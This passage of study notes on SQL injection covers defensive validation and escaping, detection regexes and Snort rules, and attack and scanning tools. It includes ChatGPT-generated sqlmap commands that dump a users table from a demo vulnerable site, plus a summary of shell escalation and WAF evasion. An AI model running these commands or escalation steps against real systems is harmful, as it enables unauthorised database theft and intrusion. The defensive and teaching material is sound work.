- **Whitelist validation** (positive) — only pre-approved types/values/ranges/chars (regex).
- **Blacklist validation** (negative) — block known-bad chars `' | % | -- | ; | /* | \* | _ | [ | @ | xp_` (weaker, combine with whitelist).
- **Output encoding** — escape special chars (double the quote `''` or `\'`) before the query:
  ```java
  myQuery = myQuery.replace("'", "\\'");
  ```
- **LIKE clauses** — escape wildcards:
  ```csharp
  s = s.Replace("[", "[[]"); s = s.Replace("%", "[%]"); s = s.Replace("_", "[_]");
  ```
- **QUOTENAME() / REPLACE()** — wrap params (`QUOTENAME` if ≤128 chars, else `REPLACE` to double single quotes):
  ```sql
  SET @temp = N'SELECT * FROM employees WHERE emp_lname = ''' + REPLACE(@emp_lname,'''','''''') + N'''';
  ```
- Disable risky commands like `xp_cmdshell`; connect with non-privileged accounts.

### Detecting SQL injection (regex / IDS)
Meta-characters: `'`, `%27`, `--`, `%2D`, `#`, `%23`, `%3D` (=), `%3B` (;), `%3C`/`%3E` (< >), `%2F` (/). Flags: `i` case-insensitive, `x` ignore whitespace.
```
/(\')|(\%27)|(\-\-)|(#)|(\%23)/ix                                      -- SQL meta-characters
/((\%3D)|(=))[^\n]*((\%27)|(\')|(\-\-)|(\%3B)|(;))/ix                  -- = followed by SQLi chars
/\w*((\%27)|(\'))((\%6F)|o|(\%4F))((\%72)|r|(\%52))/ix                 -- ' OR pattern
/((\%27)|(\'))union/ix                                                -- UNION (also insert/update/select/delete/drop)
/exec(\s|\+)+(s|x)p\w+/ix                                             -- MSSQL exec sp_/xp_ procedures
```
Snort rule example:
```
alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (msg:"SQL Injection - Paranoid";
flow:to_server,established; uricontent:".pl";
pcre:"/(\')|(\%27)|(\-\-)|(#)|(\%23)/ix";
classtype:Web-application-attack; sid:9099; rev:5;)

alert tcp any any -> any $HTTP_PORTS (msg:"SQL use of sleep function in HTTP header - likely SQL injection attempt";
flow:to_server,established; http_header; content:"User-Agent|3A| ";
content:"sleep(",fast_pattern,nocase;
pcre:"/User-Agent\x3A\x20[^\r\n]*sleep\x28/i";
classtype:web-application-attack; sid:38993; rev:9;)
```

## 8. Tools
- **sqlmap** — open-source automation; Boolean/time/error/UNION/stacked/out-of-band; enumerate DBs/users/hashes, dump tables, crack hashes, run OS commands.
- **Mole** — automated exploitation (union / Boolean); MySQL/PostgreSQL/SQL Server/Oracle; GET/POST/Cookie; IPS/IDS-bypass filters.
- Others: jSQL Injection, NoSQLMap, Havij, blind_sql_bitshifting.
- **Detection tools:** OWASP ZAP, Damn Small SQLi Scanner (DSSS), Snort, Ghauri, Burp Suite, HCL AppScan, Invicti, SQL Invader, Arachni, Qualys WAS, Fortify WebInspect, BeSECURE, SolarWinds SEM, sqlifinder, dotDefender, Wapiti, InsightAppSec, Acunetix, Detectify.

### AI-assisted SQL injection (ChatGPT → sqlmap)
```bash
# "Check for all possible SQL injection on target url http://testphp.vulnweb.com"
sqlmap -u "http://testphp.vulnweb.com" --batch --crawl=5 --random-agent --level=5 --risk=3
# Error-based + enumerate
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --technique=E --dbs \
 && sqlmap -u "...?cat=1" -D acuart --tables \
 && sqlmap -u "...?cat=1" -D acuart -T users --columns \
 && sqlmap -u "...?cat=1" -D acuart -T users --dump
```
Flags: `--batch` (no prompts), `--crawl=5` (depth), `--random-agent`, `--level=5` (thoroughness 1–5), `--risk=3` (aggressiveness 1–3). Similar prompts drive Boolean-based, time-based, and UNION-based enumeration.

> Flow: gather info (entry paths, DB engine, error leakage) → detect with `'`/`AND 1=1` vs `AND 1=2` → launch by channel — in-band (error/UNION), blind (Boolean/time/heavy), or out-of-band (DNS/HTTP) → escalate (enumerate schema, grab hashes, `xp_cmdshell`/`OUTFILE` for OS/shell, triggers for persistence) → evade IDS/WAF with encoding, comments, concatenation, fragmentation. Defend with parameterized queries + whitelist validation + least privilege + custom errors + WAF/IDS signatures, and never concatenate user input into SQL.
